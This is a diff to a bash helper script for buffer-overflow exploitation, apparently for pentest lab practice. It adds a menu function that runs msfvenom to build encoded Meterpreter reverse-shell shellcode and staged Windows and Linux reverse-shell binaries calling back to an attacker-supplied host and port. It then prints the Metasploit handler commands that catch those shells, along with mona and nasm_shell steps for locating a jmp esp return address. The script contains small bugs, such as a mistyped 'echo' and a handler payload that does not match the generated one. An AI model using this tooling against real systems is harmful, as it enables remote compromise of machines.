@@ -10,15 +10,98 @@
 # - chmod +x thisFile.sh
 
 # Functions
+generate_msfpayload () {
+
+    # rev shell call back options
+    echo -n " [?] What is your LHOST ip? (kali box)"
+    read PG_LHOST
+    echo -n " [?] What is your LPORT (nc listerner port)"
+    read PG_LPORT
+
+    # payload options
+    echo -n " [?] OS for the payload to target (win,lin)"
+    read TARGET_OS
+    echo -n " [?] If you have any badchars, add them here (example: \x00\x0a\x0d)"
+    read BAD_CHARS
+    echo -n " [?] shellcode EXITFUNC (example: process,thread,seh)"
+    read PG_EXITFUNC
+
+    echo "     1. Shellcode based payload"
+    echo "     2. Binary based payload"
+    echo "[]> Select option [ENTER]"
+    read payload_option
+     echo
+
+        if [ "$payload_option" == "1" ]; then
+          echo "[*] Generating Shellcode based payload"
+              if [ "$TARGET_OS" == "win" ]; then
+                  echo " [*] Targetting windows "
+                  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f c -e x86/shikata_ga_nai -b $BAD_CHARS exitfunc=$PG_EXITFUNC
+                  echo "
+
+                  "
+              elif [ "$TARGET_OS" == "lin"]; then
+                  echo " [*] generating linux based reverse shell binary..."
+                  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f c -e x86/shikata_ga_nai -b $BAD_CHARS exitfunc=$PG_EXITFUNC
+                  echo "
+
+                 "
+              else
+                echo " [!] Ivalid selection"
+              fi
+        elif [ "$payload_option" == "2" ]; then
+          echo " [*] Generating staged binary based payload"
+              if [ "$TARGET_OS" == "win" ]; then
+                  echo " [*] Building staged https windows meterpreter reverse shell"
+                  msfvenom -p windows/meterpreter/reverse_https LHOST=$PG_LHOST LPORT=$PG_LPORT -f exe -o revShellHTTPS.exe 
+                  echo "
+                            USE:
+                            use exploit/multi/handler
+                            set PAYLOAD windows/shell/reverse_tcp 
+                            set LHOST $PG_LHOST
+                            set LPORT $PG_LPORT
+                            set ExitOnSession false
+                            exploit -j -z
+                  "
+              elif [ "$TARGET_OS" == "lin"]; then
+                  echo " [*] generating linux based reverse shell binary..."
+                  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$PG_LHOST LPORT=$PG_LPORT -f elf > shell.elf
+                  ehco "
+                            USE:
+                            use exploit/multi/handler
+                            set PAYLOAD payload linux/x86/shell/reverse_tcp
+                            set LHOST $PG_LHOST
+                            set LPORT $PG_LPORT
+                            set ExitOnSession false
+                            exploit -j -z
+
+                 "
+              else
+                echo " [!] Ivalid selection"
+
+              fi
+
+        else
+          echo " [!] Ivalid selection"
+        fi
+
+}
+
+
 run_ldo () {
   echo " [*] Executed option 4 - output below."
   echo
   echo " ____________________________________________________________________________________________"
   echo " # search dll or module for paticular instructions using immunity"
-  echo " Command:  !mona find -s "\xff\xe4" -m slmfc.dll"
+  echo " Command:  !mona find -s '\xff\xe4' -m slmfc.dll"
   echo
   echo " #check all DLLs and modules mapped in memory by debugged application using immunity "
-  echo " Command:  !Mona modules "
+  echo " Command:  !mona modules "
+  echo
+  echo " # Get return codes using NASM Shell"
+  echo " Command: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb "
+  echo "          NASM> jmp esp "
+  echo "            --> 00000000  FFE4              jmp esp"
   echo "_____________________________________________________________________________________________"
 }
 
@@ -51,7 +134,7 @@ run_genBytes () {
 # main menu
 echo "[----------------------------------------------------------------------------------------------]"
 echo "[    Press 1 : Generate unqieue bytes (for detecting EIP overwrite)                            ]"
-echo "[    Press 2 : Generate Binary based payload usinf msfvenom (used for shells/rev shells)       ]"
+echo "[    Press 2 : Generate shell/Binary based payload usinf msfvenom (used for shells/rev shells) ]"
 echo "[    Press 3 : RSG (reverse Shell Generator - dump a list of Reverse shell one-liners)         ]"
 echo "[    Press 4 : LDO - List debugger one-liners (just simple debuuger/BOF commands for mona etc) ]"
 echo "[----------------------------------------------------------------------------------------------]"
@@ -65,7 +148,7 @@ if [ "$menu_option" == "1" ]; then
   run_genBytes
 
 elif [ "$menu_option" == "2" ]; then
-  echo " [*] You selected option 2"
+  generate_msfpayload
 
 elif [ "$menu_option" == "3" ]; then
   echo " [*] You selected option 3"
